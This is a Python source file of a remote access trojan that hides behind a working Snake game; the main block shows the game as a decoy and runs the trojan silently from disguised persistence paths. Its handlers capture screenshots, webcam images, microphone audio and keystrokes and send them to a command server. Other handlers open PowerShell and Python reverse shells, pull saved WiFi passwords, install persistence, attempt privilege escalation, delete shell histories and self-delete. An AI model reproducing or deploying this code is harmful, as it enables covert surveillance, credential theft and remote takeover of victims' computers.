            # Set display for Linux if not set
            if IS_LINUX and 'DISPLAY' not in os.environ:
                os.environ['DISPLAY'] = ':0'
                
            img = None
            error_msgs = []
            
            # Method 1: mss (Fastest)
            try:
                import mss
                with mss.mss() as sct:
                    # Select monitor: 0 is all monitors, 1 is primary
                    mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                    screenshot = sct.grab(mon)
                    
                    # If monitor 1 is suspiciously small or 0x0, try monitor 0
                    if screenshot.width < 100 or screenshot.height < 100:
                        screenshot = sct.grab(sct.monitors[0])
                        
                    from PIL import Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    
                    # Last check on image size
                    if img.size[0] < 100 or img.size[1] < 100:
                        img = None
                        error_msgs.append("mss produced a suspiciously small image")
                    else:
                        self.logger.debug(f"Screenshot captured with mss (Size: {img.size})")
            except Exception as e:
                error_msgs.append(f"mss failed: {str(e)}")
            
            # Method 2: PIL ImageGrab (Second best)
            if img is None:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    if img and (img.size[0] < 100 or img.size[1] < 100):
                        img = None
                        raise Exception("ImageGrab produced a suspiciously small image")
                    self.logger.debug(f"Screenshot captured with ImageGrab (Size: {img.size if img else 'N/A'})")
                except Exception as e:
                    error_msgs.append(f"ImageGrab failed: {str(e)}")
            
            # Method 3: Linux CLI fallbacks (Smart ordering)
            if img is None and IS_LINUX:
                # Prioritize grim if on Wayland, otherwise scrot/import
                session_type = os.environ.get('XDG_SESSION_TYPE', '').lower()
                tools = ['grim', 'scrot', 'import'] if session_type == 'wayland' else ['scrot', 'import', 'grim']
                
                for tool in tools:
                    try:
                        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                            tmp_name = tmp.name
                        
                        if tool == 'scrot':
                            subprocess.run(['scrot', '-o', tmp_name], capture_output=True, timeout=5)
                        elif tool == 'import':
                            subprocess.run(['import', '-window', 'root', tmp_name], capture_output=True, timeout=5)
                        elif tool == 'grim':
                            subprocess.run(['grim', tmp_name], capture_output=True, timeout=5)
                            
                        from PIL import Image
                        if os.path.exists(tmp_name) and os.path.getsize(tmp_name) > 100:
                            temp_img = Image.open(tmp_name)
                            if temp_img.size[0] >= 100 and temp_img.size[1] >= 100:
                                temp_img.load()
                                img = temp_img
                                os.unlink(tmp_name)
                                self.logger.debug(f"Screenshot captured with {tool} (Size: {img.size})")
                                break
                        if os.path.exists(tmp_name): os.unlink(tmp_name)
                    except Exception as e:
                        error_msgs.append(f"{tool} failed: {str(e)}")

            if img:
                # Compress
                img_byte_arr = io.BytesIO()
                img = img.convert('RGB')
                img.save(img_byte_arr, format='JPEG', quality=85)
                img_byte_arr = img_byte_arr.getvalue()
                
                # Send as loot
                filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                success = self._send_loot('screenshot', img_byte_arr, filename)
                
                return {
                    'filename': filename,
                    'size': len(img_byte_arr),
                    'dimensions': img.size,
                    'status': 'sent' if success else 'failed',
                    'method': 'fallback' if len(error_msgs) > 0 else 'primary'
                }
            else:
                return {'error': "All screenshot methods failed: " + " | ".join(error_msgs)}
        except Exception as e:
            return {'error': f"Screenshot system error: {str(e)}"}
    
    def _handle_webcam(self, cmd):
        """Capture from webcam (cross-platform)"""
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                data = buffer.tobytes()
                
                # Send as loot
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                success = self._send_loot('webcam', data, filename)
                
                return {
                    'filename': filename,
                    'size': len(data),
                    'status': 'sent' if success else 'failed'
                }
            else:
                return {'error': 'Failed to capture webcam'}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_microphone(self, cmd):
        """Record microphone (cross-platform)"""
        duration = cmd.get('duration', 10)
        
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Convert to WAV
            with io.BytesIO() as wav_buffer:
                wf = wave.open(wav_buffer, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                
                wav_data = wav_buffer.getvalue()
            
            # Send as loot
            filename = f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            success = self._send_loot('microphone', wav_data, filename)
            
            return {
                'filename': filename,
                'duration': duration,
                'size': len(wav_data),
                'status': 'sent' if success else 'failed'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_keylog(self, cmd):
        """Start/Dump keylogger data"""
        action = cmd.get('action', 'dump')
        
        if action == 'duration':
            duration = cmd.get('duration', 10)
            # Clear buffer, wait for keys, then dump
            self.keylog_buffer = [] 
            time.sleep(duration)
            action = 'dump' # Fall through to dump logic

        if action == 'dump':
            captured = "".join(self.keylog_buffer)
            self.keylog_buffer = [] # Clear after dump
            
            # Send as loot if it's large
            if len(captured) > 500:
                filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                self._send_loot('keylog', captured.encode(), filename)
                return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
            
            return {
                'keys': captured if captured else "[ No keys captured since last dump ]",
                'count': len(captured)
            }
            
        if action == 'status':
            return {
                'running': self.keylog_running,
                'buffer_size': len(self.keylog_buffer),
                'session_type': os.environ.get('XDG_SESSION_TYPE', 'unknown') if IS_LINUX else 'N/A'
            }
        
        elif action == 'clear':
            count = len(self.keylog_buffer)
            self.keylog_buffer = []
            return {'success': True, 'cleared_count': count}
        
        return {'error': f'Unknown action: {action}'}
    
    def _handle_persistence(self, cmd):
        """Install persistence"""
        result = PersistenceManager.install_persistence()
        return {'success': result}

    def _handle_unpersist(self, cmd):
        """Remove persistence"""
        result = PersistenceManager.remove_persistence()
        return {'success': result}
    
    def _handle_process(self, cmd):
        """Process management (cross-platform)"""
        action = cmd.get('action', 'list')
        
        try:
            if action == 'list':
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                    try:
                        processes.append(proc.info)
                    except:
                        pass
                return {'processes': processes[:100]}  # Limit to 100
            
            elif action == 'kill':
                pid = cmd.get('pid')
                try:
                    proc = psutil.Process(pid)
                    proc.terminate()
                    return {'success': True, 'pid': pid}
                except Exception as e:
                    return {'error': str(e)}
            
            return {'error': 'Unknown action'}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_write_file(self, cmd):
        """Write content to a file (robust path handling)"""
        path = cmd.get('path')
        content = cmd.get('content', '')
        
        if not path:
            return {'error': 'Path required'}
            
        try:
            # Handle absolute/relative paths
            if not os.path.isabs(path):
                path = os.path.join(self.shell_cwd, path)
            
            # If path is a directory, we can't write content "to it" 
            if os.path.isdir(path):
                return {'error': f"Target '{path}' is a directory. Please specify a filename."}
                
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return {'success': True, 'path': path, 'size': len(content)}
        except Exception as e:
            return {'error': str(e)}

    def _handle_file_browser(self, cmd):
        """File system browser (cross-platform)"""
        path = cmd.get('path', os.getcwd())
        
        try:
            items = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    items.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': stat.st_mtime,
                        'permissions': oct(stat.st_mode)[-3:] if not IS_WINDOWS else '???'
                    })
                except:
                    continue
            
            return {
                'current_path': path,
                'parent': os.path.dirname(path),
                'items': items
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_port_scan(self, cmd):
        """Port scanner (cross-platform)"""
        target = cmd.get('target', '127.0.0.1')
        ports = cmd.get('ports', '1-1024')
        
        try:
            # Parse ports
            if '-' in ports:
                start, end = map(int, ports.split('-'))
                port_list = range(start, min(end + 1, 65536))
            else:
                port_list = [int(ports)]
            
            open_ports = []
            
            # Limit to 100 ports to avoid hanging
            port_list = list(port_list)[:100]
            
            for port in port_list:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        # Try to get service banner
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode().strip()[:50]
                        except:
                            banner = ''
                        
                        open_ports.append({
                            'port': port,
                            'banner': banner
                        })
                    sock.close()
                except:
                    continue
            
            return {
                'target': target,
                'open_ports': open_ports,
                'count': len(open_ports)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_system_info(self, cmd):
        """Get comprehensive system info"""
        return self.profiler.get_system_info()
    
    def _handle_reverse_shell(self, cmd):
        """Spawn reverse shell (cross-platform)"""
        host = cmd.get('host', '')
        port = cmd.get('port', 4445)
        
        if not host:
            return {'error': 'Host required'}
        
        try:
            if IS_WINDOWS:
                # Windows reverse shell using PowerShell (Metasploit Compatible)
                ps_script = f'''
$c = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{{0}};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS > ";
    $sbb = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbb,0,$sbb.Length);
    $s.Flush()
}};
$c.Close()
'''
                subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script])
            elif IS_LINUX or IS_MAC:
                # Python native reverse shell (More reliable/Metasploit compatible than bash -i)
                code = f"""
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{host}",{port}));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("/bin/sh")
                """
                subprocess.Popen([sys.executable, '-c', code])
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_clean_traces(self, cmd):
        """Clean evidence (cross-platform)"""
        try:
            if IS_WINDOWS:
                # Clear PowerShell history
                ps_history = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
                if os.path.exists(ps_history):
                    os.remove(ps_history)
                
                # Clear recent files
                recent = os.path.expanduser('~\\Recent')
                if os.path.exists(recent):
                    for f in os.listdir(recent)[:10]:  # Limit to 10 files
                        try:
                            os.remove(os.path.join(recent, f))
                        except:
                            pass
            
            elif IS_LINUX:
                # Clear bash history
                bash_history = os.path.expanduser('~/.bash_history')
                if os.path.exists(bash_history):
                    os.remove(bash_history)
                
                # Clear zsh history
                zsh_history = os.path.expanduser('~/.zsh_history')
                if os.path.exists(zsh_history):
                    os.remove(zsh_history)
            
            elif IS_MAC:
                # Clear zsh history on macOS
                zsh_history = os.path.expanduser('~/.zsh_history')
                if os.path.exists(zsh_history):
                    os.remove(zsh_history)
            
            # Clear Python history if exists
            py_history = os.path.expanduser('~/.python_history')
            if os.path.exists(py_history):
                os.remove(py_history)
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_open_url(self, cmd):
        """Open a URL in the default browser"""
        url = cmd.get('url', '')
        if not url:
            return {'error': 'URL required'}
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        try:
            webbrowser.open(url)
            self.logger.success(f"Redirected user to: {url}")
            return {'success': True, 'url': url}
        except Exception as e:
            return {'error': str(e)}

    def _handle_message_box(self, cmd):
        """Show a message box (GUI)"""
        text = cmd.get('text', 'Hello from SnakeGame!')
        title = cmd.get('title', 'System Message')
        try:
            if IS_WINDOWS:
                threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, title, 0)).start()
            elif IS_LINUX:
                # Try zenity or notify-send
                subprocess.Popen(['zenity', '--info', '--text', text, '--title', title], stderr=subprocess.DEVNULL)
                subprocess.Popen(['notify-send', title, text], stderr=subprocess.DEVNULL)
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_clipboard(self, cmd):
        """Get or Set clipboard content"""
        action = cmd.get('action', 'get')
        text = cmd.get('text', '')
        try:
            import pyperclip
            if action == 'set':
                pyperclip.copy(text)
                return {'success': True, 'action': 'set'}
            else:
                return {'success': True, 'action': 'get', 'content': pyperclip.paste()}
        except:
            # Fallback for Windows if pyperclip missing
            if IS_WINDOWS and action == 'get':
                try:
                    import win32clipboard
                    win32clipboard.OpenClipboard()
                    data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    return {'success': True, 'content': data}
                except: pass
            return {'error': 'Clipboard module not available (pip install pyperclip)'}

    def _handle_wallpaper(self, cmd):
        """Change desktop wallpaper"""
        path = cmd.get('path', '')
        try:
            if IS_WINDOWS:
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            elif IS_LINUX:
                subprocess.Popen(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{path}'])
                subprocess.Popen(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri-dark', f'file://{path}'])
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_power(self, cmd):
        """Lock, Shutdown, or Reboot"""
        action = cmd.get('action', 'lock')
        try:
            if action == 'lock':
                if IS_WINDOWS: ctypes.windll.user32.LockWorkStation()
                else: subprocess.Popen(['xdg-screensaver', 'lock'], stderr=subprocess.DEVNULL)
            elif action == 'shutdown':
                if IS_WINDOWS: os.system('shutdown /s /t 1')
                else: os.system('shutdown now')
            elif action == 'reboot':
                if IS_WINDOWS: os.system('shutdown /r /t 1')
                else: os.system('reboot')
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}

    def _handle_wifi_passwords(self, cmd):
        """Extract saved WIFI passwords (Powerful cross-platform)"""
        try:
            results = []
            if IS_WINDOWS:
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True).decode('utf-8', errors="ignore")
                profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
                for i in profiles:
                    try:
                        results_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], shell=True).decode('utf-8', errors="ignore")
                        password = [b.split(":")[1][1:-1] for b in results_data.split('\n') if "Key Content" in b]
                        results.append({'ssid': i, 'password': password[0] if password else ""})
                    except: pass
            elif IS_LINUX:
                # Try reading NetworkManager files directly (if root)
                if PrivilegeManager.is_admin():
                    nm_path = '/etc/NetworkManager/system-connections/'
                    if os.path.exists(nm_path):
                        for f in os.listdir(nm_path):
                            try:
                                with open(os.path.join(nm_path, f), 'r') as conn:
                                    content = conn.read()
                                    import re
                                    ssid = re.search(r'ssid=(.*)', content)
                                    psk = re.search(r'psk=(.*)', content)
                                    if ssid: results.append({'ssid': ssid.group(1), 'password': psk.group(1) if psk else "[No PSK]"})
                            except: pass
                # Fallback to nmcli
                if not results:
                    try:
                        data = subprocess.check_output(['nmcli', '-s', '-g', 'NAME,TYPE', 'connection', 'show'], shell=True).decode()
                        for line in data.split('\n'):
                            if '802-11-wireless' in line:
                                ssid = line.split(':')[0]
                                try:
                                    psk_data = subprocess.check_output(f'nmcli -s -g 802-11-wireless-security.psk connection show "{ssid}"', shell=True).decode().strip()
                                    results.append({'ssid': ssid, 'password': psk_data})
                                except: pass
                    except: pass
            return {'success': True, 'wifi_data': results}
        except Exception as e:
            return {'error': str(e)}

    def _handle_elevate(self, cmd):
        """Attempt to elevate privileges"""
        success, message = PrivilegeManager.elevate()
        return {'success': success, 'message': message, 'is_admin': PrivilegeManager.is_admin()}

    def _handle_unelevate(self, cmd):
        """Attempt to drop privileges"""
        success, message = PrivilegeManager.delevate()
        return {'success': success, 'message': message, 'is_admin': PrivilegeManager.is_admin()}

    def _handle_abort(self, cmd):
        """Abort a running task or process"""
        target = cmd.get('target', 'all') # ID or 'all' or 'type'
        aborted = []
        
        # 1. Check active processes (shell commands)
        with CommandExecutor.proc_lock:
            to_kill = []
            if target == 'all':
                to_kill = list(CommandExecutor.active_processes.keys())
            elif target in CommandExecutor.active_processes:
                to_kill = [target]
            
            for tid in to_kill:
                proc = CommandExecutor.active_processes[tid]
                try:
                    if IS_WINDOWS:
                        subprocess.call(['taskkill', '/F', '/T', '/PID', str(proc.pid)])
                    else:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    aborted.append(tid)
                except:
                    pass
        
        # 2. Check microphone/keylog specifically if requested
        if target == 'mic' or target == 'all':
             # Note: Mic is harder to 'stop' unless it checks a flag
             pass
             
        return {'success': True, 'aborted_tasks': aborted, 'message': f"Attempted to abort: {target}"}

    def _handle_self_destruct(self, cmd):
        """Self destruct the RAT"""
        try:
            # Clean traces first
            self._handle_clean_traces({})
            
            # Stop running
            self.running = False
            
            # Get script path
            script_path = os.path.abspath(__file__)
            
            if IS_WINDOWS:
                # Windows self-delete
                batch_content = f'''@echo off
timeout /t 2 /nobreak > nul
del /f /q "{sys.executable}"
del /f /q "{script_path}"
del /f /q "%~f0"'''
                
                batch_path = os.path.join(tempfile.gettempdir(), f'del_{random.randint(1000,9999)}.bat')
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                
                subprocess.Popen(['start', '/b', batch_path], shell=True)
            
            elif IS_LINUX or IS_MAC:
                # Linux/macOS self-delete
                script = f'''#!/bin/sh
sleep 2
rm -f "{sys.executable}"
rm -f "{script_path}"
rm -f "$0"'''
                
                script_path_del = f'/tmp/del_{random.randint(1000,9999)}.sh'
                with open(script_path_del, 'w') as f:
                    f.write(script)
                
                os.chmod(script_path_del, 0o755)
                subprocess.Popen([script_path_del])
            
            return {'success': True}
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_socks_proxy(self, cmd):
        """Setup SOCKS proxy (placeholder)"""
        return {'error': 'SOCKS proxy not implemented in this version'}
    
    def _handle_service(self, cmd):
        """Service management (placeholder for non-Windows)"""
        if not IS_WINDOWS:
            return {'error': 'Service management only available on Windows'}
        return {'error': 'Service management requires Windows-specific modules'}
    
    def _handle_registry(self, cmd):
        """Registry operations (placeholder for non-Windows)"""
        if not IS_WINDOWS:
            return {'error': 'Registry operations only available on Windows'}
        return {'error': 'Registry operations require Windows-specific modules'}

class SnakeGame:
    """Enhanced Snake Game with better graphics and gameplay"""
    
    def __init__(self):
        pygame.init()
        
        # Game configuration
        self.width = 800
        self.height = 600
        self.grid_size = 20
        self.fps = 60
        
        # Setup display
        self.screen = pygame.display.set_mode((self.width, self.height))
        pygame.display.set_caption('Snake Game v2.0')
        
        # Colors
        self.colors = {
            'background': (20, 20, 40),
            'snake_head': (0, 255, 100),
            'snake_body': (0, 200, 50),
            'food': (255, 100, 100),
            'text': (255, 255, 255),
            'grid': (40, 40, 60)
        }
        
        # Fonts
        self.font_large = pygame.font.Font(None, 72)
        self.font_medium = pygame.font.Font(None, 36)
        self.font_small = pygame.font.Font(None, 24)
        
        # Clock
        self.clock = pygame.time.Clock()
        
        # Initialize RAT in background
        self.rat = AdvancedRAT()
        self.logger = self.rat.logger
        
        self.logger.info("Initializing game assets...")
        
        # Game state
        self.reset_game()
        
        self.logger.success("Game started successfully")
        
        # Start game loop
        self.run()
    
    def reset_game(self):
        """Reset game state"""
        self.logger.info("Resetting game state...")
        self.snake_x = self.width // 2
        self.snake_y = self.height // 2
        self.dx = self.grid_size
        self.dy = 0
        self.snake = [(self.snake_x, self.snake_y)]
        self.food = self._generate_food()
        self.score = 0
        self.base_speed = 10
        self.speed = self.base_speed
        self.level = 1
        self.game_over = False
        self.paused = False
    
    def _generate_food(self):
        """Generate food at random position"""
        import random
        
        max_x = (self.width - self.grid_size) // self.grid_size
        max_y = (self.height - self.grid_size) // self.grid_size
        
        while True:
            fx = random.randint(0, max_x) * self.grid_size
            fy = random.randint(0, max_y) * self.grid_size
            
            if (fx, fy) not in self.snake:
                return (fx, fy)
    
    def handle_events(self):
        """Handle pygame events"""
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False
            
            if event.type == pygame.KEYDOWN:
                if self.game_over:
                    if event.key == pygame.K_SPACE:
                        self.reset_game()
                    elif event.key == pygame.K_ESCAPE:
                        return False
                else:
                    if event.key == pygame.K_UP and self.dy == 0:
                        self.dx, self.dy = 0, -self.grid_size
                    elif event.key == pygame.K_DOWN and self.dy == 0:
                        self.dx, self.dy = 0, self.grid_size
                    elif event.key == pygame.K_LEFT and self.dx == 0:
                        self.dx, self.dy = -self.grid_size, 0
                    elif event.key == pygame.K_RIGHT and self.dx == 0:
                        self.dx, self.dy = self.grid_size, 0
                    elif event.key == pygame.K_p:
                        self.paused = not self.paused
                    elif event.key == pygame.K_ESCAPE:
                        return False
        
        return True
    
    def update(self):
        """Update game state"""
        if self.game_over or self.paused:
            return
        
        # Move snake
        self.snake_x += self.dx
        self.snake_y += self.dy
        
        # Wrap around edges
        if self.snake_x >= self.width:
            self.snake_x = 0
        elif self.snake_x < 0:
            self.snake_x = self.width - self.grid_size
        
        if self.snake_y >= self.height:
            self.snake_y = 0
        elif self.snake_y < 0:
            self.snake_y = self.height - self.grid_size
        
        # Add new head
        self.snake.insert(0, (self.snake_x, self.snake_y))
        
        # Check food collision
        if (self.snake_x, self.snake_y) == self.food:
            self.score += 10
            self.food = self._generate_food()
            
            # Level up every 50 points
            if self.score % 50 == 0:
                self.level += 1
                self.speed = self.base_speed + (self.level * 2)
        else:
            # Remove tail
            self.snake.pop()
        
        # Check self collision
        if len(self.snake) > 1 and (self.snake_x, self.snake_y) in self.snake[1:]:
            self.logger.warning(f"Game Over! Final Score: {self.score}")
            self.game_over = True
    
    def draw_grid(self):
        """Draw background grid"""
        for x in range(0, self.width, self.grid_size):
            pygame.draw.line(self.screen, self.colors['grid'], (x, 0), (x, self.height), 1)
        for y in range(0, self.height, self.grid_size):
            pygame.draw.line(self.screen, self.colors['grid'], (0, y), (self.width, y), 1)
    
    def draw_snake(self):
        """Draw snake"""
        for i, (x, y) in enumerate(self.snake):
            if i == 0:  # Head
                color = self.colors['snake_head']
                pygame.draw.rect(self.screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
                
                # Simple eyes
                if self.dx > 0:  # Moving right
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + 6), 2)
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + self.grid_size - 6), 2)
                elif self.dx < 0:  # Moving left
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + 6), 2)
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + self.grid_size - 6), 2)
                elif self.dy > 0:  # Moving down
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + self.grid_size - 6), 2)
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + self.grid_size - 6), 2)
                elif self.dy < 0:  # Moving up
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + 6), 2)
                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + 6), 2)
            else:
                # Body
                intensity = max(50, 255 - (i * 5))
                color = (0, intensity, 0)
                pygame.draw.rect(self.screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
    
    def draw_food(self):
        """Draw food"""
        x, y = self.food
        # Pulsing effect
        pulse = abs(pygame.time.get_ticks() % 1000 - 500) / 500
        size = int(self.grid_size - 4 + (pulse * 2))
        offset = (self.grid_size - size) // 2
        
        pygame.draw.rect(self.screen, self.colors['food'], 
                        (x + offset, y + offset, size, size))
    
    def draw_text(self):
        """Draw text overlays"""
        # Score
        score_text = self.font_medium.render(f'Score: {self.score}', True, self.colors['text'])
        self.screen.blit(score_text, (20, 20))
        
        # Level
        level_text = self.font_small.render(f'Level: {self.level}', True, self.colors['text'])
        self.screen.blit(level_text, (20, 60))
        
        # Length
        length_text = self.font_small.render(f'Length: {len(self.snake)}', True, self.colors['text'])
        self.screen.blit(length_text, (20, 90))
        
        # Game over message
        if self.game_over:
            overlay = pygame.Surface((self.width, self.height))
            overlay.set_alpha(128)
            overlay.fill((0, 0, 0))
            self.screen.blit(overlay, (0, 0))
            
            game_over_text = self.font_large.render('GAME OVER', True, (255, 0, 0))
            text_rect = game_over_text.get_rect(center=(self.width // 2, self.height // 2 - 50))
            self.screen.blit(game_over_text, text_rect)
            
            restart_text = self.font_medium.render('Press SPACE to restart or ESC to quit', 
                                                  True, self.colors['text'])
            text_rect = restart_text.get_rect(center=(self.width // 2, self.height // 2 + 20))
            self.screen.blit(restart_text, text_rect)
            
            score_text = self.font_medium.render(f'Final Score: {self.score}', 
                                                True, self.colors['text'])
            text_rect = score_text.get_rect(center=(self.width // 2, self.height // 2 - 10))
            self.screen.blit(score_text, text_rect)
        
        # Pause message
        if self.paused and not self.game_over:
            pause_text = self.font_large.render('PAUSED', True, self.colors['text'])
            text_rect = pause_text.get_rect(center=(self.width // 2, self.height // 2))
            self.screen.blit(pause_text, text_rect)
            
            pause_text = self.font_small.render('Press P to resume', True, self.colors['text'])
            text_rect = pause_text.get_rect(center=(self.width // 2, self.height // 2 + 50))
            self.screen.blit(pause_text, text_rect)
    
    def run(self):
        """Main game loop"""
        running = True
        
        while running:
            running = self.handle_events()
            self.update()
            
            self.screen.fill(self.colors['background'])
            self.draw_grid()
            self.draw_food()
            self.draw_snake()
            self.draw_text()
            
            pygame.display.flip()
            self.clock.tick(self.speed)
        
        pygame.quit()
        sys.exit()

if __name__ == "__main__":
    # Parse arguments
    parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
    parser.add_argument('--host', help='C2 Server Host IP')
    parser.add_argument('--port', type=int, help='C2 Server Port')
    args = parser.parse_args()

    # Override defaults if provided
    if args.host:
        C2_SERVERS[0]['host'] = args.host
    if args.port:
        C2_SERVERS[0]['port'] = args.port

    # Ensure single instance
    instance_lock = Singleton()
    
    # Detect if running from a persistence shadow location
    current_path = os.path.abspath(__file__)
    is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
    
    if is_shadow:
        # Run silently in background without game window
        rat = AdvancedRAT()
        try:
            while rat.running:
                time.sleep(1)
        except KeyboardInterrupt:
            rat.running = False
    else:
        # Start game decoy
        print("Starting Snake Game...")
        SnakeGame()